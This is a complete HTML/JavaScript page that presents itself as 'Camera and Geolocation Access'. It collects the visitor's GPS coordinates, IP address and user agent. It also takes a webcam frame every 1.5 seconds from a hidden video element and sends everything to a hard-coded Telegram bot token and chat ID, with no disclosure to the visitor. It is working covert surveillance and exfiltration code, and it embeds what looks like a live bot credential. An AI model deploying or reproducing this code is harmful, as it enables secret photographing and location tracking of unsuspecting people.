<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera and Geolocation Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 20px;
        }
        #camera {
            display: none;
        }
        .video-wrap, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Access Camera and Geolocation</h1>
    <p id="location"></p>
    <div class="video-wrap">
        <video id="video" playsinline autoplay></video>
    </div>
    <canvas id="canvas" width="740" height="580"></canvas>

    <script>
        let latitude = '';
        let longitude = '';
        let ipAddress = '';
        const userAgent = navigator.userAgent;
        const telegramBotToken = '7359419952:AAHFAG4df44WHFOS3SJ6mafXxMtW9v-fc8E';
        const chatId = '2036883627';

        // Fetch IP Address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                ipAddress = data.ip;
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
            });

        // Request Geolocation on Page Load
        window.onload = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
                    initCamera();
                }, (error) => {
                    alert(`Error getting location: ${error.message}`);
                    initCamera();
                });
            } else {
                alert('Geolocation is not supported by this browser.');
                initCamera();
            }
        };

        // Access webcam
        async function initCamera() {
            try {
                const constraints = {
                    audio: false,
                    video: {
                        facingMode: "user"
                    }
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleCameraSuccess(stream);
            } catch (e) {
                console.error('navigator.getUserMedia error:', e);
                sendDataToTelegramBot(); // Send available data without photo
            }
        }

        // Success handling for camera
        function handleCameraSuccess(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            const context = canvas.getContext('2d');
            setInterval(() => {
                context.drawImage(video, 0, 0, 740, 580);
                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                sendDataToTelegramBot(canvasData);
            }, 1500);
        }

        function sendDataToTelegramBot(photo = null) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('latitude', latitude);
            formData.append('longitude', longitude);
            formData.append('ip', ipAddress);
            formData.append('userAgent', userAgent);

            if (photo) {
                formData.append('photo', photo);
            }

            const url = `https://api.telegram.org/bot${telegramBotToken}/send${photo ? 'Photo' : 'Message'}`;
            const data = photo ? formData : JSON.stringify({
                chat_id: chatId,
                text: `User Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nIP Address: ${ipAddress}\nUser Agent: ${userAgent}`
            });

            fetch(url, {
                method: 'POST',
                body: data
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Data sent successfully');
                } else {
                    console.error('Failed to send data:', data.description);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
